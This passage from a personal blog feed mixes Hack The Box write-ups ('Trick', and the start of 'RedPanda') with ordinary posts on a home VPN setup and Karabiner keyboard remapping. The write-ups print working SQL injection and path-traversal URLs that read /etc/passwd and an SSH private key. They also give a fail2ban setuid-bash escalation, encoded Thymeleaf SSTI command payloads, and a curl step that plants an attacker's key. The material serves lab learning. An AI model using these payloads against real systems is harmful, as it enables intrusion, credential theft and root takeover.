        _conf(&quot;Are you sure to delete this employee?&quot;,&quot;remove_employee&quot;,[$(this).attr('data-id')])
      })
    });
    function remove_employee(id){
      start_load()
      $.ajax({
        url:'ajax.php?action=delete_employee',
        method:&quot;POST&quot;,
        data:{id:id},
        error:err=&gt;console.log(err),
        success:function(resp){
            if(resp == 1){
              alert_toast(&quot;Employee's data successfully deleted&quot;,&quot;success&quot;);
                setTimeout(function(){
                location.reload();

              },1000)
            }
          }
      })
    }`
</code></pre><p>At face value this just shows that the page will open some modals/pop-ups, which it does when we click on certain buttons, but the real interest here is that <code>+$id</code> parameter that&rsquo;s being added on&hellip; Smells like a SQLi opportunity.</p>
<p>Sure enough, after fuzzing it with a few payloads, we can do a union select with it.</p>
<pre><code>http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,3,4,5,6,7,8
</code></pre><p>This doesn&rsquo;t give us anything, but since we know it&rsquo;s vulnerable we can move on to more fun <a href="https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2">like using it for LFI/RFI</a>:</p>
<pre><code>http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/etc/passwd%27),4,5,6,7,8
</code></pre><p>And look at that, we&rsquo;ve replaced one of the parts of data returned with the <code>/etc/passwd</code> file:</p>
<pre><code>rootâ0:0:root:/root:/bin/bashdaemonâ1:1:daemon:/usr/sbin:/usr/sbin/nologinbinâ2:2:bin:/bin:/usr/sbin/nologinsysâ3:3:sys:/dev:/usr/sbin/nologinsyncâ4:65534:sync:/bin:/bin/syncgamesâ5:60:games:/usr/games:/usr/sbin/nologinmanâ6:12:man:/var/cache/man:/usr/sbin/nologinlpâ7:7:lp:/var/spool/lpd:/usr/sbin/nologinmailâ8:8:mail:/var/mail:/usr/sbin/nologinnewsâ9:9:news:/var/spool/news:/usr/sbin/nologinuucpâ10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxyâ13:13:proxy:/bin:/usr/sbin/nologinwww-dataâ33:33:www-data:/var/www:/usr/sbin/nologinbackupâ34:34:backup:/var/backups:/usr/sbin/nologinlistâ38:38:Mailing List Manager:/var/list:/usr/sbin/nologinircâ39:39:ircd:/var/run/ircd:/usr/sbin/nologingnatsâ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobodyâ65534:65534:nobody:/nonexistent:/usr/sbin/nologin_aptâ100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesyncâ101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-networkâ102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolveâ103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebusâ104:110::/nonexistent:/usr/sbin/nologintssâ105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasqâ106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmuxâ107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkitâ108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulseâ109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcherâ110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahiâ111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsanedâ112:121::/var/lib/saned:/usr/sbin/nologincolordâ113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclueâ114:123::/var/lib/geoclue:/usr/sbin/nologinhplipâ115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdmâ116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredumpâ999:999:systemd Core Dumper:/:/usr/sbin/nologinmysqlâ117:125:MySQL Server,,,:/nonexistent:/bin/falsesshdâ118:65534::/run/sshd:/usr/sbin/nologinpostfixâ119:126::/var/spool/postfix:/usr/sbin/nologinbindâ120:128::/var/cache/bind:/usr/sbin/nologinmichaelâ1001:1001::/home/michael:/bin/bash
</code></pre><p>Let&rsquo;s save this for later, but the key thing of interest here is that we can pull <em>some</em> content from the local filesystem.</p>
<p>At this point I slammed my head against the wall trying to do further enumeration for another hour or so, and eventually took a look at the HTB Forum thread on this. Unfortunately, this spoiled things a bit for me (I was able to guess the other hostname based on <code>pre****-mar******</code> being in a comment), but I went back after to do some more digging on it!</p>
<h1 id="enabled-and-available">Enabled and Available</h1>
<p>Earlier I mentioned that the server responses confirmed we&rsquo;re running Nginx. This means we <em>likely</em> have a few static file locations we can look at. Since we have RFI here, let&rsquo;s try pulling some.</p>
<p>We can get the nginx <code>access.log</code> file - <code>view-source:http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/var/log/nginx/access.log%27),4,5,6,7,8</code>. This could actually provide you with some good content on a shared box, but I&rsquo;m on a VIP instance so I can only see my own traffic - you might get one of the other hostnames leaked here if not using VIP which would be a nice win and honestly a good &ldquo;real world&rdquo; example of how this could work.</p>
<p>Another file we can look at for enumeration is <code>/etc/nginx/sites-available/default</code>:</p>
<pre><code>server {
  listen 80 default_server;
  listen [::]:80 default_server;
  server_name trick.htb;
  root /var/www/html;

  index index.html index.htm index.nginx-debian.html;

  server_name _;

  location / {
    try_files $uri $uri/ =404;
  }

  location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
  }
}


server {
  listen 80;
  listen [::]:80;

  server_name preprod-marketing.trick.htb;

  root /var/www/market;
  index index.php;

  location / {
    try_files $uri $uri/ =404;
  }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
</code></pre><p>Well look at that, we have another hostname that wasn&rsquo;t there in the zone transfer - <code>preprod-marketing.trick.htb</code>. Let&rsquo;s add that to the ol' <code>/etc/hosts</code> file and move over to it.</p>
<h1 id="the-classics">The classics</h1>
<p>Marketing&rsquo;s website is where this becomes a bit more basic, thankfully, as the enumeration up to this point has been more difficult than I had expected given the challenge&rsquo;s rating.</p>
<p>The main thing to take note of on the marketing page is that the page seems to be running off of PHP <code>incloude</code>s, whereas the payroll site was using nav anchors to load content. This means we can <em>probably</em> use some basic path traversal, though it may need to get somewhat obfuscated as many challenges (and of course real world scenarios) will filter this either with application code or a WAF):</p>
<p><code>http://preprod-marketing.trick.htb/index.php?page=about.html</code> isn&rsquo;t of any use to us, but what about <code>http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd</code>? Well, no, sadly. Maybe if we tweak that a bit further?</p>
<p><code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd</code>:</p>
<pre><code>rootâ0:0:root:/root:/bin/bash daemonâ1:1:daemon:/usr/sbin:/usr/sbin/nologin binâ2:2:bin:/bin:/usr/sbin/nologin sysâ3:3:sys:/dev:/usr/sbin/nologin syncâ4:65534:sync:/bin:/bin/sync gamesâ5:60:games:/usr/games:/usr/sbin/nologin manâ6:12:man:/var/cache/man:/usr/sbin/nologin lpâ7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailâ8:8:mail:/var/mail:/usr/sbin/nologin newsâ9:9:news:/var/spool/news:/usr/sbin/nologin uucpâ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxyâ13:13:proxy:/bin:/usr/sbin/nologin www-dataâ33:33:www-data:/var/www:/usr/sbin/nologin backupâ34:34:backup:/var/backups:/usr/sbin/nologin listâ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin ircâ39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnatsâ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobodyâ65534:65534:nobody:/nonexistent:/usr/sbin/nologin _aptâ100:65534::/nonexistent:/usr/sbin/nologin systemd-timesyncâ101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-networkâ102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolveâ103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebusâ104:110::/nonexistent:/usr/sbin/nologin tssâ105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasqâ106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmuxâ107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkitâ108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulseâ109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcherâ110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahiâ111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin sanedâ112:121::/var/lib/saned:/usr/sbin/nologin colordâ113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclueâ114:123::/var/lib/geoclue:/usr/sbin/nologin hplipâ115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdmâ116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredumpâ999:999:systemd Core Dumper:/:/usr/sbin/nologin mysqlâ117:125:MySQL Server,,,:/nonexistent:/bin/false sshdâ118:65534::/run/sshd:/usr/sbin/nologin postfixâ119:126::/var/spool/postfix:/usr/sbin/nologin bindâ120:128::/var/cache/bind:/usr/sbin/nologin michaelâ1001:1001::/home/michael:/bin/bash
</code></pre><p>That looks familiar, but, ugh, we could already get this with the SQLi from earlier&hellip; maybe we&rsquo;re running as a different user for this site? We can&rsquo;t get <code>/etc/shadow</code> so we&rsquo;re probably not <code>root</code>, but maybe we&rsquo;re the <code>michael</code> user (or someone with access to their home)? They seem to be the only user on the box&hellip;</p>
<p>One <code>GET</code> to <code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/user.txt</code> and we have our first flag! Woohoo!</p>
<h1 id="get-a-grip-or-a-foothold">Get a grip (or a foothold)</h1>
<p>Next step, let&rsquo;s get on this box. Fortunately <code>michael</code> is kind enough to have his private key in its default location, and it can be used for ssh:</p>
<pre><code>$ curl -o id_rsa http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
$ chmod 0600 id_rsa
$ ssh -i id_rsa michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
</code></pre><h1 id="do-you-prefer-taking-the-elevator-or-the-escalator">Do you prefer taking the elevator or the escalator?</h1>
<p>Now that we&rsquo;ve got reliable access we can try to get <code>root</code> access. We can start out by <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">running <code>linpeas</code> to see if we have anything interesting</a>.</p>
<p>One thing that pops up a lot in the output here is that we&rsquo;ve running <code>fail2ban</code> (non-default, which is why it stands out) and _the <code>/etc/fail2ban/action.d</code> directory is writeable for our current user. The other thing that makes this really stand out as either a deliberate rabbithole, or our path to root, is that we also happen to have the ability to restart the <code>fail2ban</code> service as our <em>only</em> <code>NOPASSWD</code> <code>sudo</code> privilege:</p>
<pre><code> (root) NOPASSWD: /etc/init.d/fail2ban restart
</code></pre><p><code>fail2ban</code> is a great application in that it can be used to block IPs via iptables, or perform <em>other arbitrary actions</em> when a given scenario is hit. A simple example is that if we multiple SSH failures are detected from an IP, <code>fail2ban</code> will block access from that IP via <code>iptables</code> for a set period of time.</p>
<p>In this challenge, the situation above is exactly how it works, and it&rsquo;s set for a period of 10 seconds. Sure enough, it&rsquo;s also running as <code>root</code> so we can do whatever we want with this service as long as we can modify the config:</p>
<pre><code>michael@trick:/dev/shm$ ps aux |grep fail2ban
root        729  0.0  1.0 248664 20580 ?        Ssl  12:10   0:01 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
</code></pre><p>One quick overwrite of <code>/etc/fail2ban/action.d/iptables-multiport.conf</code> to ironically change <code>actionban</code> from blocking our IP to making <code>/bin/bash</code> a <code>setuid</code> variable with <code>chmod +s /bin/bash</code>, a restart of <code>fail2ban</code>, and after a few failed SSH attempts with a junk password:</p>
<pre><code>michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash

michael@trick:/etc/fail2ban/action.d$ /bin/bash -p
bash-5.0# whoami
root
</code></pre><p>Note: Updating <code>/bin/bash</code> to have the <code>setuid</code> bit is just one of many possible solutions here. A reverse shell, other permission changes, etc&hellip; are all equally valid solutions.</p>
<p>GG!</p>
]]></content></item><item><title>Bell HomeHub 4000 + Ubiquiti Unifi Dream Machine VPN</title><link>https://www.maclaren.dev/posts/2022-09/bell_udm/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-09/bell_udm/</guid><description>This article is a bit more to-the-point than most others I&amp;rsquo;ve written, and is mostly to serve as a reference point for others trying to configure a VPN server with Unifi products behind the Bell HomeHub 4000.
The HomeHub 4000 DMZ works&amp;hellip; kinda The HomeHub 4000 doesn&amp;rsquo;t have Bridge mode, period. This leaves users with three options:
Find a way to use PPPoE directly (possible, but janky) Use the &amp;ldquo;Advanced DMZ&amp;rdquo; feature on the HomeHub 4000 (Spoilers: It doesn&amp;rsquo;t work at all) Use the normal DMZ feature on the HomeHub 4000 and deal with double-NAT After several days of troubleshooting I opted for option 3 from the list above.</description><content type="html"><![CDATA[<p>This article is a bit more to-the-point than most others I&rsquo;ve written, and is mostly to serve as a reference point for others trying to configure a VPN server with Unifi products behind the Bell HomeHub 4000.</p>
<h1 id="the-homehub-4000-dmz-works-kinda">The HomeHub 4000 DMZ works&hellip; kinda</h1>
<p>The HomeHub 4000 doesn&rsquo;t have <code>Bridge mode</code>, period. This leaves users with three options:</p>
<ol>
<li>Find a way to use PPPoE directly (possible, but janky)</li>
<li>Use the &ldquo;Advanced DMZ&rdquo; feature on the HomeHub 4000 (Spoilers: It doesn&rsquo;t work <em>at all</em>)</li>
<li>Use the normal DMZ feature on the HomeHub 4000 and deal with double-NAT</li>
</ol>
<p>After several days of troubleshooting I opted for option 3 from the list above.</p>
<ul>
<li>The UDM doesn&rsquo;t have an SFP port, and I wasn&rsquo;t going to shell out for a media converter, so that removed option 1.</li>
<li>Option 2 resulted in my UDM getting the Bell public IP as expected, but under no circumstances could it send traffic. I&rsquo;ve seen some other blog/forum posts noting that it can work if you add custom routes, but this feels so far off the supported/intended path that it&rsquo;s not worth the headache to troubleshoot if things go wrong.</li>
<li>Option 3, at first, seemed to be totally broken, but wound up working fine&hellip;</li>
</ul>
<h1 id="the-udms-vpn-works-kinda">The UDM&rsquo;s VPN works&hellip; kinda</h1>
<p>When I was using bridge mode on my old connection, I happily made use of the built-in VPN solution that the UDM (and UDM Pro) line offer. No port forwarding required, no drama, and easy to handle networking for VPN clients, as well as individual credential sets.</p>
<p>Unfortuately for me, the Ubiquiti software <em>refuses to enable the VPN server if it detects that it&rsquo;s on a NAT&rsquo;d connection</em>. Why it does this is completely beyond me, but it will flat out refuse to work <em>despite allowing you to enable it anyway</em>.</p>
<p>I spent <em>days</em> troubleshooting this, thinking that the problem was the HomeHub 4000&rsquo;s &ldquo;DMZ&rdquo;, but it was&rsquo;t. The Ubiquiti software just won&rsquo;t actually accept connections even if they originate from the same LAN (ruling out any firewall/NAT issues).</p>
<p>Fortunately, the new <code>Teleport</code> feature does work, but that feels like more headache than it&rsquo;s worth <em>for my use case</em> and I don&rsquo;t want to be an early adopter. It&rsquo;s also not possible, currently, to customize the subnet that Teleport VPN clients land on, and they have no access to the rest of the network(s), making it completely useless to me as the whole point is to access my LAN resources while AFK.</p>
<h1 id="wireguard">Wireguard</h1>
<p>After wrestling with Teleport for a while, I realized I could just run my own Wireguard server. I have a finite number of devices I want to use, and having a config file/QR code to scan is much simpler than managing credentials, or needing specific one-time-use URLs, etc&hellip; I just want to get connected.</p>
<p>Docker and Wireguard to the rescue! Within 30 minute I was up and running - just needed to place my UDM in the &ldquo;DMZ&rdquo; of the HomeHub 4000&rsquo;s config, port forward to the configured UDP port for Wireguard&rsquo;s container on my server, and it all &ldquo;just works&rdquo;!</p>
<h1 id="resources">Resources</h1>
<p>If you&rsquo;re interested in playing around with Wireguard, the config is <a href="https://github.com/maclarel/homelab/blob/master/wireguard/docker-compose.yml">this easy</a>. I used parts from several tutorials beyond that, but <a href="https://codeopolis.com/posts/installing-wireguard-in-docker/">this one</a> is probably the most succinct.</p>
<p>Just run <code>docker logs</code> for your <code>wireguard</code> container and you&rsquo;ll get the QR codes for easy mobile device configuration, or hope to your configured <code>config</code> directory to pull out the <code>peer.conf</code> file(s) to use with your other systems.</p>
<p>These are both then trivial to use with the official Wireguard apps available for non-Linux platforms, or of course with Wireguard proper if you&rsquo;re connecting from a Linux box.</p>
<h1 id="back-to-normal">Back to normal</h1>
<p>After a few frustrating weeks, I&rsquo;m now actually working with a <em>better</em> VPN config than I had before. No hassles with it, instantaneous connection, and great bandwidth speed compared to OpenVPN.</p>
<p>Hopefully Bell pushes a firmware update to the HomeHub 4000 with bridge mode some day, but I&rsquo;m not holding my breath.</p>
]]></content></item><item><title>Karabiner is a game changer</title><link>https://www.maclaren.dev/posts/2022-09/karabiner/</link><pubDate>Sun, 04 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-09/karabiner/</guid><description>What is Karabiner and why? Karabiner Elements is an open source MacOS application that can be used to intercept and modify any keystroke, combination, etc&amp;hellip; on your machine and change it to do damn near anything you want. If you follow my blog or know me, you&amp;rsquo;ll know that I&amp;rsquo;m a big fan of custom keyboards and the flexibility that they allow by way of QMK or similar firmware - Karabiner recreates a lot of that functionality at the software level.</description><content type="html"><![CDATA[<h1 id="what-is-karabiner-and-why">What is Karabiner and why?</h1>
<p><a href="https://github.com/pqrs-org/Karabiner-Elements">Karabiner Elements</a> is an open source MacOS application that can be used to intercept and modify any keystroke, combination, etc&hellip; on your machine and change it to do damn near anything you want. If you follow my blog or know me, you&rsquo;ll know that I&rsquo;m a big fan of custom keyboards and the flexibility that they allow by way of QMK or similar firmware - Karabiner recreates a lot of that <em>functionality</em> at the software level.</p>
<h1 id="whats-the-feature-set">What&rsquo;s the feature set?</h1>
<p>Broadly, Karabiner Elements will let you intercept any keystroke and have it perform an arbitrary task for you. This could consist of changing a press of your Escape key to running a shell script instead, or noting that you want your spacebar to send a blank space character if tapped, but to toggle Caps Lock if held.</p>
<p>On custom keyboards you can do a lot of this through firmware like QMK, which also means that it&rsquo;s portable (without software) to any machine you use, however if you find yourself working from a laptop keyboard and really missing Hyper/Meh/Layers/autoshift/etc&hellip; then you&rsquo;re in for a real treat with this software</p>
<p>One of the great things about Karabiner is that the configuration is dotfile driven, so you can sync your configs quite easily via git and symlinks (possibly another post about my dotfiles strategy later&hellip;), but I always prefer software that&rsquo;s config file driven rather than relying solely on <code>plist</code> files.</p>
<h1 id="what-am-i-using-it-for">What am I using it for?</h1>
<p>While I make use of QMK pretty extensively, it&rsquo;s not to the extent of folks like <a href="https://www.youtube.com/c/BenVallack">Ben Vallack</a>. None the less, I make extensive use of Hyper/Meh (various combinations of Meta/Alt/Ctrl/Shift) to control my window manager (<a href="https://github.com/ianyh/Amethyst">Amethyst</a>) and virtual desktops. Additionally, I try to reduce chording (multi-keypress combinations) whenever reasonable - to that end I set all of my number row and symbol keys (e.g. 1, 2, 3, <code>,</code>, <code>.</code>, <code>[</code>) to enter their normal character if tapped, and their shifted value if held (e.g. <code>1</code> on tap, <code>!</code> if held).</p>
<p>Honestly, Karabiner has been a game changer for me. I&rsquo;ve gone from dreading using my laptop&rsquo;s keyboard to only mildly disliking it. Given that I&rsquo;m starting to travel a bit more again, that&rsquo;s a huge win in my books!</p>
<h1 id="resources">Resources</h1>
<p>If you&rsquo;re interested in playing around with Karabiner, you can check out the following resources:</p>
<ul>
<li><a href="https://www.reddit.com/r/Karabiner/">The Karabiner subreddit</a></li>
<li><a href="https://karabiner-elements.pqrs.org/docs/">The Karabiner docs</a></li>
<li><a href="https://github.com/maclarel/dotfiles/blob/main/.config/karabiner/karabiner.json">My dotfiles</a></li>
</ul>
]]></content></item><item><title>Hack The Box - RedPanda</title><link>https://www.maclaren.dev/posts/2022-08/htb_redpanda/</link><pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-08/htb_redpanda/</guid><description>Premise RedPanda is a machine challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&amp;rsquo;ve completed so far&amp;hellip; despite being on the &amp;ldquo;easy&amp;rdquo; end of the spectrum.
Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p>RedPanda is a <code>machine</code> challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&hellip; despite being on the &ldquo;easy&rdquo; end of the spectrum.</p>
<p>Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest. From talking to others who have completed the challenge, I probably took a strange path.</p>
<h1 id="recon">Recon</h1>
<p>The machine doesn&rsquo;t respond to ICMP, which had me questioning my VPN connection, but this is intentional. Need to use <code>-Pn</code> with <code>nmap</code> to scan despite this.</p>
<ul>
<li>22 and 8080 open</li>
<li>22 is ssh</li>
<li>8080 is a spring boot app</li>
</ul>
<p><code>ffuf</code> suggests there are /search, /stats, and /error endpoints. <code>/stats</code> gives us some other paths to look at</p>
<p>There&rsquo;s a hint on the <code>greg</code> page that there&rsquo;s an injection possible somewhere. The stats pages also have an export capability that will dump XML - possible a vector here if we&rsquo;re able to upload content somehow? Doesn&rsquo;t look like there&rsquo;s an endpoint for that.</p>
<p>The author search is a parameterized URL. Smells like a job for <code>sqlmap</code>, though in the end it doesn&rsquo;t think it&rsquo;s injectable even with max level risk, so this was a dead end.</p>
<p>Nikto is noting that the server allows other methods that could be fun:</p>
<pre><code>OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</code></pre><p>This may be a false positive though as none of the endpoints I can hit (including root) actually return these with an OPTIONS call. Apparently this is just a weird thing with spring boot and may be worth ignoring</p>
<p>There appears to be some form of filtering for the search as the <code>_</code> character is &ldquo;banned&rdquo;, and we can throw a 500 by searching for <code>\</code>. The search allows us to do partials, so we can go by each letter and see what we get back. For example <code>e</code> will return <code>smiley</code> as one of the results. This gives us lots of cute pandas, but nothing actionable.</p>
<p>Input does seem to be sanitized for what&rsquo;s returned, so no XSS or obvious sqli. Stats <em>might</em> have something injectable but as noted above, no real luck with it&hellip;</p>
<p>And after some more poking at this&hellip; WE HAVE SSTI! - <code>*{7*7}</code> - some examples of different prefixes @ <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a> in <code>hacking thymeleaf</code> heading. <a href="https://github.com/VikasVarshney/ssti-payload">https://github.com/VikasVarshney/ssti-payload</a> is also an excellent tool to generate these payloads.</p>
<ul>
<li>Note from future me: This level of encoding was entirely unneeded, but it did work and since I could easily build the encoded string with a script I just ran with it. Obfuscation is a good skill, right? :P</li>
</ul>
<p>Here&rsquo;s an example SSTI we can use to do a whoami:</p>
<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
</code></pre><p>and uname -a:</p>
<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
</code></pre><p>We can use this to get our user flag:</p>
<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
</code></pre><p>Do they have an ssh key we can pull? Doesn&rsquo;t look like it&hellip; but we could probably generate one.</p>
<p>Let&rsquo;s try an encoded version of <code>ssh-keygen -b 2048 -t rsa -f /tmp/sshkely -q -N &quot;&quot;</code>:</p>
<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(115).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(113)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(34))).getInputStream())}
</code></pre><p>Yep, that works. Now let&rsquo;s get the public key, and cat it into our authorized keys&hellip; so same deal as above, but need to create our <code>.ssh</code> dir first.</p>
<p>This will probably work, but getting errors with the private key we can leak. Let&rsquo;s try adding my own public key to the remote authorized_keys. We&rsquo;ll probably need to do this by setting up a webserver with python to serve an authorized_keys file we&rsquo;ve created, pull it down with curl, and then update perms. Echoing a string with redirects gets filtered.</p>
<p>Bingo - <code>woodenk@redpanda:~$ </code></p>
<p>Commands we used or encoded:</p>
<pre><code>cp ~/.ssh/id_rsa.pub authorized_keys
python3 -m http.server
# encode and send the rest to remote server
mkdir /home/woodenk/.ssh
curl http://&lt;vpn_ip&gt;:8000/authorized_keys -o /home/woodenk/.ssh/authorized_keys
chmod -R 0700 /home/woodenk/.ssh
chown -R woodenk:woodenk /home/woodenk/.ssh
</code></pre><h1 id="lets-get-to-the-root-of-the-problem">Let&rsquo;s get to the root of the problem</h1>
<p>Looks like we have a few processes running as <code>root</code> but <code>sudo</code>ing the execution as <code>woodenk</code>&hellip; cron job?:</p>
<pre><code>root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
